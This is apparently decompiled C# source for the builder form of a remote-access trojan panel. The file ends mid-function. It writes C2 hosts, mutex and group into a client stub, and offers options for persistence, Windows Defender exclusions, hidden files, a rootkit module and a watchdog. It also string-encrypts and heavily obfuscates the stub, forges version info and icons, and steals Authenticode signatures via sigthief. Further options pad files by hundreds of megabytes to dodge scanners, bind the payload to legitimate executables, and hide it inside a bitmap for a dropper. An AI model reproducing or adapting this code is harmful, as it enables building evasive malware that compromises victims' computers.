using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Obfuscator.Obfuscator.CtrlFlow;
using Obfuscator.Obfuscator.IntProtect;
using Obfuscator.Obfuscator.Junk;
using Obfuscator.Obfuscator.ManyProxy;
using Obfuscator.Obfuscator.Mixer;
using Obfuscator.Obfuscator.Proxy;
using Obfuscator.Obfuscator.Rename;
using Server.Data;
using Server.Helper;
using Server.Helper.Bulider;
using Vestris.ResourceLib;

namespace Server.Forms
{
	// Token: 0x02000092 RID: 146
	public partial class FormBulider : FormMaterial
	{
		// Token: 0x060003D6 RID: 982 RVA: 0x00029DE6 File Offset: 0x00027FE6
		public FormBulider()
		{
			this.InitializeComponent();
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x00029DF4 File Offset: 0x00027FF4
		private void FormBulider_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			if (File.Exists("local\\Settings.json"))
			{
				Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				this.rjTextBox1.Texts = "0.0.0.0:" + string.Join(",", settings.Ports);
			}
			if (File.Exists("local\\Bulider.json"))
			{
				BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText("local\\Bulider.json"));
				this.checkBox20.Checked = bulidData.CheckIcon;
				this.checkBox21.Checked = bulidData.CheckAssembly;
				this.checkBox22.Checked = bulidData.DigitalSignature;
				if (bulidData.CheckIcon)
				{
					File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
					this.pictureBox1.ImageLocation = "local\\temp.ico";
				}
				foreach (string value in bulidData.Hosts)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow();
					dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = value
					});
					this.GridIps.Rows.Add(dataGridViewRow);
				}
				this.TextBoxProduct.Texts = bulidData.Product;
				this.TextBoxDescription.Texts = bulidData.Description;
				this.TextBoxCompany.Texts = bulidData.Company;
				this.TextBoxCopyright.Texts = bulidData.Copyright;
				this.TextBoxTrademarks.Texts = bulidData.Trademarks;
				this.TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
				this.TextBoxProductVersion.Texts = bulidData.ProductVersion;
				this.TextBoxFileVersion.Texts = bulidData.FileVersion;
				this.checkBox1.Checked = bulidData.Install;
				this.checkBox8.Checked = bulidData.ExclusionWD;
				this.checkBox6.Checked = bulidData.HiddenFile;
				this.checkBox4.Checked = bulidData.RootKit;
				this.checkBox9.Checked = bulidData.Pump;
				this.checkBox7.Checked = bulidData.UserInit;
				this.checkBox5.Checked = bulidData.InstallWatchDog;
				this.rjTextBox2.Texts = bulidData.TaskClient;
				this.rjTextBox5.Texts = bulidData.TaskWatchDog;
				this.rjComboBox1.Texts = bulidData.PathClientCmb;
				this.rjTextBox3.Texts = bulidData.PathClientBox;
				this.rjComboBox2.Texts = bulidData.PathWatchDogCmb;
				this.rjTextBox4.Texts = bulidData.PathWatchDogBox;
				this.rjTextBox7.Texts = bulidData.Group;
				this.rjTextBox6.Texts = bulidData.Mutex;
			}
			this.checkBox20.CheckedChanged += this.checkBox20_CheckedChanged;
			base.FormClosing += delegate(object es, FormClosingEventArgs se)
			{
				BulidData bulidData2 = new BulidData();
				bulidData2.CheckIcon = this.checkBox20.Checked;
				bulidData2.CheckAssembly = this.checkBox21.Checked;
				bulidData2.DigitalSignature = this.checkBox22.Checked;
				bulidData2.Icon = (this.checkBox20.Checked ? File.ReadAllBytes(this.pictureBox1.ImageLocation) : null);
				bulidData2.Product = this.TextBoxProduct.Texts;
				bulidData2.Description = this.TextBoxDescription.Texts;
				bulidData2.Company = this.TextBoxCompany.Texts;
				bulidData2.Copyright = this.TextBoxCopyright.Texts;
				bulidData2.Trademarks = this.TextBoxTrademarks.Texts;
				bulidData2.OriginalFilename = this.TextBoxOriginalFileName.Texts;
				bulidData2.ProductVersion = this.TextBoxProductVersion.Texts;
				bulidData2.FileVersion = this.TextBoxFileVersion.Texts;
				bulidData2.Install = this.checkBox1.Checked;
				bulidData2.ExclusionWD = this.checkBox8.Checked;
				bulidData2.HiddenFile = this.checkBox6.Checked;
				bulidData2.RootKit = this.checkBox4.Checked;
				bulidData2.Pump = this.checkBox9.Checked;
				bulidData2.UserInit = this.checkBox7.Checked;
				bulidData2.InstallWatchDog = this.checkBox5.Checked;
				bulidData2.TaskClient = this.rjTextBox2.Texts;
				bulidData2.TaskWatchDog = this.rjTextBox5.Texts;
				bulidData2.PathClientCmb = this.rjComboBox1.Texts;
				bulidData2.PathClientBox = this.rjTextBox3.Texts;
				bulidData2.PathWatchDogCmb = this.rjComboBox2.Texts;
				bulidData2.PathWatchDogBox = this.rjTextBox4.Texts;
				bulidData2.Group = this.rjTextBox7.Texts;
				bulidData2.Mutex = this.rjTextBox6.Texts;
				List<string> list = new List<string>();
				foreach (object obj in ((IEnumerable)this.GridIps.Rows))
				{
					DataGridViewRow dataGridViewRow2 = (DataGridViewRow)obj;
					list.Add((string)dataGridViewRow2.Cells[0].Value);
				}
				bulidData2.Hosts = list.ToArray();
				File.WriteAllText("local\\Bulider.json", JsonConvert.SerializeObject(bulidData2, Formatting.Indented));
			};
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x0002A0DC File Offset: 0x000282DC
		private void ChangeScheme(object sender)
		{
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox4.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox5.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox6.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox7.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxOriginalFileName.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxDescription.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxCompany.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxProduct.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxCopyright.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxTrademarks.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxFileVersion.BorderColor = FormMaterial.PrimaryColor;
			this.TextBoxProductVersion.BorderColor = FormMaterial.PrimaryColor;
			this.rjComboBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
			this.rjButton2.BackColor = FormMaterial.PrimaryColor;
			this.rjButton3.BackColor = FormMaterial.PrimaryColor;
			this.rjButton4.BackColor = FormMaterial.PrimaryColor;
			this.rjButton5.BackColor = FormMaterial.PrimaryColor;
			this.rjButton6.BackColor = FormMaterial.PrimaryColor;
			this.rjButton7.BackColor = FormMaterial.PrimaryColor;
			this.rjButton8.BackColor = FormMaterial.PrimaryColor;
			this.rjButton9.BackColor = FormMaterial.PrimaryColor;
			this.rjButton10.BackColor = FormMaterial.PrimaryColor;
			this.rjButton11.BackColor = FormMaterial.PrimaryColor;
			this.rjButton12.BackColor = FormMaterial.PrimaryColor;
			this.GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x0002A30D File Offset: 0x0002850D
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			this.panel1.Enabled = this.checkBox1.Checked;
		}

		// Token: 0x060003DA RID: 986 RVA: 0x0002A328 File Offset: 0x00028528
		private void checkBox5_CheckedChanged(object sender, EventArgs e)
		{
			this.rjTextBox4.Enabled = this.checkBox5.Checked;
			this.rjComboBox2.Enabled = this.checkBox5.Checked;
			this.rjTextBox5.Enabled = this.checkBox5.Checked;
		}

		// Token: 0x060003DB RID: 987 RVA: 0x0002A378 File Offset: 0x00028578
		private void WriteSettings(ModuleDefMD moduleDefMd)
		{
			string randomCharactersAscii = Randomizer.getRandomCharactersAscii();
			string randomCharactersAscii2 = Randomizer.getRandomCharactersAscii();
			string randomCharactersAscii3 = Randomizer.getRandomCharactersAscii();
			EncryptString encryptString = new EncryptString();
			string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
			encryptString.dec = Methods.Shuffle(str);
			encryptString.enc = Methods.Shuffle(encryptString.dec);
			X509Certificate2 x509Certificate = new X509Certificate2(new X509Certificate2("ServerCertificate.p12", "", X509KeyStorageFlags.Exportable).Export(X509ContentType.Cert));
			moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii, Xor.DecodEncod(x509Certificate.Export(X509ContentType.Cert), Encoding.ASCII.GetBytes(randomCharactersAscii3)), ManifestResourceAttributes.Private));
			if (this.checkBox4.Checked)
			{
				moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii2, Xor.DecodEncod(File.ReadAllBytes("Stub\\UserMode.obf.dll"), Encoding.ASCII.GetBytes(randomCharactersAscii3)), ManifestResourceAttributes.Private));
			}
			foreach (TypeDef typeDef in moduleDefMd.Types)
			{
				foreach (MethodDef methodDef in typeDef.Methods)
				{
					if (methodDef.Body != null)
					{
						for (int i = 0; i < methodDef.Body.Instructions.Count<Instruction>(); i++)
						{
							if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
							{
								if (typeDef.Name != "EncryptString")
								{
									if (!(typeDef.Name == "Config"))
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(methodDef.Body.Instructions[i].Operand as string);
										goto IL_E8B;
									}
									if (methodDef.Body.Instructions[i].Operand as string == "Software\\gogoduck" || methodDef.Body.Instructions[i].Operand as string == "Win32_Processor" || methodDef.Body.Instructions[i].Operand as string == "Name" || methodDef.Body.Instructions[i].Operand as string == "dd.MM.yyyy" || methodDef.Body.Instructions[i].Operand as string == "Win32_VideoController" || methodDef.Body.Instructions[i].Operand as string == "," || methodDef.Body.Instructions[i].Operand as string == "Admin" || methodDef.Body.Instructions[i].Operand as string == "User" || methodDef.Body.Instructions[i].Operand as string == "true")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(methodDef.Body.Instructions[i].Operand as string);
									}
								}
								if (typeDef.Name == "EncryptString")
								{
									if (methodDef.Body.Instructions[i].Operand as string == "%dec%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.dec;
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%enc%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.enc;
									}
								}
								else
								{
									if (methodDef.Body.Instructions[i].Operand as string == "%Hosts%")
									{
										List<string> list = new List<string>();
										foreach (object obj in ((IEnumerable)this.GridIps.Rows))
										{
											DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
											list.Add((string)dataGridViewRow.Cells[0].Value);
										}
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(string.Join(";", list));
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Version%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("1.8");
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Group%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.rjTextBox7.Texts);
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Mutex%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.rjTextBox6.Texts);
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Key%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii3);
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Cerificate%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii);
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%Install%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox1.Checked.ToString().ToLower());
									}
									if (methodDef.Body.Instructions[i].Operand as string == "%AntiVirtual%")
									{
										methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
									}
									if (this.checkBox1.Checked)
									{
										if (methodDef.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox5.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%UseInstallAdmin%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%ExclusionWD%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox8.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%HiddenFile%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox6.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%UserInit%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox7.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%RootKit%")
										{
											if (this.checkBox4.Checked)
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii2);
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("false");
											}
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%Pump%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.checkBox9.Checked.ToString().ToLower());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%TaskClient%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.rjTextBox2.Texts);
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%PathClient%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(this.rjComboBox1.Texts, this.rjTextBox3.Texts));
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
										{
											if (this.checkBox5.Checked)
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(this.rjTextBox5.Texts);
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
											}
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%PathWatchDog%")
										{
											if (this.checkBox5.Checked)
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(this.rjComboBox2.Texts, this.rjTextBox4.Texts));
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
											}
										}
									}
									else
									{
										if (methodDef.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%UseInstallAdmin%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%ExclusionWD%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%HiddenFile%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%UserInit%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%PathWatchDog%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%Pump%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%TaskClient%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
										if (methodDef.Body.Instructions[i].Operand as string == "%PathClient%")
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
										}
									}
								}
							}
							IL_E8B:;
						}
					}
				}
			}
		}

		// Token: 0x060003DC RID: 988 RVA: 0x0002B2B0 File Offset: 0x000294B0
		private void checkBox20_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox20.Checked)
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					openFileDialog.Title = "Choose Icon";
					openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
					openFileDialog.Multiselect = false;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
						{
							this.pictureBox1.ImageLocation = Methods.GetIcon(openFileDialog.FileName);
						}
						else
						{
							this.pictureBox1.ImageLocation = openFileDialog.FileName;
						}
					}
				}
			}
		}

		// Token: 0x060003DD RID: 989 RVA: 0x0002B354 File Offset: 0x00029554
		private void rjButton3_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
					this.TextBoxOriginalFileName.Texts = (versionInfo.InternalName ?? string.Empty);
					this.TextBoxDescription.Texts = (versionInfo.FileDescription ?? string.Empty);
					this.TextBoxCompany.Texts = (versionInfo.CompanyName ?? string.Empty);
					this.TextBoxProduct.Texts = (versionInfo.ProductName ?? string.Empty);
					this.TextBoxCopyright.Texts = (versionInfo.LegalCopyright ?? string.Empty);
					this.TextBoxTrademarks.Texts = (versionInfo.LegalTrademarks ?? string.Empty);
					this.TextBoxFileVersion.Texts = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
					this.TextBoxProductVersion.Texts = string.Concat(new string[]
					{
						versionInfo.FileMajorPart.ToString(),
						".",
						versionInfo.FileMinorPart.ToString(),
						".",
						versionInfo.FileBuildPart.ToString(),
						".",
						versionInfo.FilePrivatePart.ToString()
					});
				}
			}
		}

		// Token: 0x060003DE RID: 990 RVA: 0x0002B534 File Offset: 0x00029734
		private void CreateBulid(string filepath)
		{
			string exd = "";
			string text = filepath;
			if (this.checkBox22.Checked)
			{
				if (text.EndsWith(".exe"))
				{
					exd = ".exe";
				}
				if (text.EndsWith(".scr"))
				{
					exd = ".scr";
				}
				text = text.Replace(".exe", "").Replace(".scr", "");
			}
			using (ModuleDefMD moduleDefMD = ModuleDefMD.Load(filepath, new ModuleCreationOptions { TryToLoadPdbFromDisk = false }))
			{
				this.WriteSettings(moduleDefMD);
				Mixer.Execute(moduleDefMD);
				ControlFlowObfuscation.Execute(moduleDefMD);
				ProxyString.Execute(moduleDefMD);
				ManyProxy.Execute(moduleDefMD);
				ProxyCall.Execute(moduleDefMD);
				Junks.Execute(moduleDefMD);
				Renamer.Execute(moduleDefMD);
				moduleDefMD.Write(text);
				moduleDefMD.Dispose();
			}
			if (this.checkBox21.Checked)
			{
				this.WriteAssembly(text);
			}
			if (this.checkBox20.Checked && !string.IsNullOrEmpty(this.pictureBox1.ImageLocation))
			{
				IconInjector.InjectIcon(text, this.pictureBox1.ImageLocation);
			}
			if (this.checkBox22.Checked)
			{
				this.PatchSignature(text, exd);
			}
		}

		// Token: 0x060003DF RID: 991 RVA: 0x0002B65C File Offset: 0x0002985C
		private void rjButton5_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
				saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.CreateBulid(saveFileDialog.FileName);
					MessageBox.Show("Build Create!");
				}
			}
		}

		// Token: 0x060003E0 RID: 992 RVA: 0x0002B6EC File Offset: 0x000298EC
		private void PatchSignature(string tmp, string exd)
		{
			string[] files = Directory.GetFiles("Signatures");
			Process.Start(new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "Scripts\\sigthief.exe",
				Arguments = string.Concat(new string[]
				{
					" -s \"",
					Path.Combine(Application.StartupPath, files[Randomizer.random.Next(files.Length)]),
					"\" -t \"",
					tmp,
					"\" -o \"",
					tmp,
					exd,
					"\""
				})
			}).WaitForExit();
			File.Delete(tmp);
		}

		// Token: 0x060003E1 RID: 993 RVA: 0x0002B790 File Offset: 0x00029990
		private void WriteAssembly(string filename, string filenameto)
		{
			try
			{
				FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(filename);
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(filenameto);
				versionResource.FileVersion = versionInfo.FileVersion;
				versionResource.ProductVersion = versionInfo.ProductVersion;
				versionResource.Language = 0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["ProductName"] = (versionInfo.ProductName ?? string.Empty);
				stringFileInfo["FileDescription"] = (versionInfo.FileDescription ?? string.Empty);
				stringFileInfo["CompanyName"] = (versionInfo.CompanyName ?? string.Empty);
				stringFileInfo["LegalCopyright"] = (versionInfo.LegalCopyright ?? string.Empty);
				stringFileInfo["LegalTrademarks"] = (versionInfo.LegalTrademarks ?? string.Empty);
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = (versionInfo.InternalName ?? string.Empty);
				stringFileInfo["OriginalFilename"] = (versionInfo.InternalName ?? string.Empty);
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				versionResource.SaveTo(filenameto);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("Assembly: " + ex.Message);
			}
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x0002B904 File Offset: 0x00029B04
		private void WriteAssembly(string filename)
		{
			try
			{
				VersionResource versionResource = new VersionResource();
				versionResource.LoadFrom(filename);
				versionResource.FileVersion = this.TextBoxFileVersion.Texts;
				versionResource.ProductVersion = this.TextBoxProductVersion.Texts;
				versionResource.Language = 0;
				StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
				stringFileInfo["ProductName"] = this.TextBoxProduct.Texts;
				stringFileInfo["FileDescription"] = this.TextBoxDescription.Texts;
				stringFileInfo["CompanyName"] = this.TextBoxCompany.Texts;
				stringFileInfo["LegalCopyright"] = this.TextBoxCopyright.Texts;
				stringFileInfo["LegalTrademarks"] = this.TextBoxTrademarks.Texts;
				stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
				stringFileInfo["InternalName"] = this.TextBoxOriginalFileName.Texts;
				stringFileInfo["OriginalFilename"] = this.TextBoxOriginalFileName.Texts;
				stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
				stringFileInfo["FileVersion"] = versionResource.FileVersion;
				versionResource.SaveTo(filename);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("Assembly: " + ex.Message);
			}
		}

		// Token: 0x060003E3 RID: 995 RVA: 0x0002BA60 File Offset: 0x00029C60
		private void rjButton1_Click(object sender, EventArgs e)
		{
			if (!this.rjTextBox1.Texts.Contains(":") || string.IsNullOrEmpty(this.rjTextBox1.Texts))
			{
				return;
			}
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = this.rjTextBox1.Texts
			});
			this.GridIps.Rows.Add(dataGridViewRow);
			this.rjTextBox1.Texts = "";
		}

		// Token: 0x060003E4 RID: 996 RVA: 0x0002BAE4 File Offset: 0x00029CE4
		private void rjButton2_Click(object sender, EventArgs e)
		{
			foreach (object obj in this.GridIps.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				this.GridIps.Rows.Remove(dataGridViewRow);
			}
		}

		// Token: 0x060003E5 RID: 997 RVA: 0x0002BB4C File Offset: 0x00029D4C
		private void rjButton4_Click(object sender, EventArgs e)
		{
			this.rjTextBox6.Texts = Randomizer.getRandomCharacters();
		}

		// Token: 0x060003E6 RID: 998 RVA: 0x0002BB60 File Offset: 0x00029D60
		private void checkBox4_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox4.Checked)
			{
				if (!this.rjTextBox3.Texts.Contains("xdwd"))
				{
					this.rjTextBox3.Texts = "xdwd" + this.rjTextBox3.Texts;
				}
				if (this.checkBox5.Checked && !this.rjTextBox4.Texts.Contains("xdwd"))
				{
					this.rjTextBox4.Texts = "xdwd" + this.rjTextBox4.Texts;
					return;
				}
			}
			else
			{
				if (this.rjTextBox3.Texts.Contains("xdwd"))
				{
					this.rjTextBox3.Texts = this.rjTextBox3.Texts.Replace("xdwd", "");
				}
				if (this.checkBox5.Checked && this.rjTextBox4.Texts.Contains("xdwd"))
				{
					this.rjTextBox4.Texts = this.rjTextBox4.Texts.Replace("xdwd", "");
				}
			}
		}

		// Token: 0x060003E7 RID: 999 RVA: 0x0002BC84 File Offset: 0x00029E84
		public void Pump(string path)
		{
			using (FileStream fileStream = File.Open(path, FileMode.OpenOrCreate))
			{
				fileStream.SetLength(fileStream.Length + (long)(new Random().Next(500, 750) * 1024 * 1024));
				fileStream.Close();
			}
		}

		// Token: 0x060003E8 RID: 1000 RVA: 0x0002BCEC File Offset: 0x00029EEC
		private void rjButton6_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
				saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.CreateBulid(saveFileDialog.FileName);
					this.Pump(saveFileDialog.FileName);
					MessageBox.Show("Build Create!");
				}
			}
		}

		// Token: 0x060003E9 RID: 1001 RVA: 0x0002BD88 File Offset: 0x00029F88
		private void rjButton7_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose program";
				openFileDialog.Filter = "Files(*.exe)|*.exe";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
						saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
						saveFileDialog.OverwritePrompt = false;
						saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							this.CreateBulid(saveFileDialog.FileName);
							this.BulidJoin(openFileDialog.FileName, saveFileDialog.FileName);
							File.Delete(saveFileDialog.FileName);
							MessageBox.Show("Build Create!");
						}
					}
				}
			}
		}

		// Token: 0x060003EA RID: 1002 RVA: 0x0002BE7C File Offset: 0x0002A07C
		public void BulidDropper(string bulid)
		{
			string text = bulid;
			string exd = "";
			if (this.checkBox22.Checked)
			{
				if (text.EndsWith(".exe"))
				{
					exd = ".exe";
				}
				if (text.EndsWith(".scr"))
				{
					exd = ".scr";
				}
				text = text.Replace(".exe", "").Replace(".scr", "");
			}
			using (ModuleDefMD moduleDefMD = ModuleDefMD.Load(bulid, new ModuleCreationOptions { TryToLoadPdbFromDisk = false }))
			{
				string randomCharacters = Randomizer.getRandomCharacters();
				using (MemoryStream memoryStream = new MemoryStream())
				{
					BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(memoryStream, ImageFormat.Bmp);
					moduleDefMD.Resources.Add(new EmbeddedResource(randomCharacters, memoryStream.ToArray(), ManifestResourceAttributes.Private));
				}
				EncryptString encryptString = new EncryptString();
				string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
				encryptString.dec = Randomizer.Shuffle(str);
				encryptString.enc = Randomizer.Shuffle(encryptString.dec);
				foreach (TypeDef typeDef in moduleDefMD.Types)
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						if (!(methodDef.Name == "WinExec"))
						{
							for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
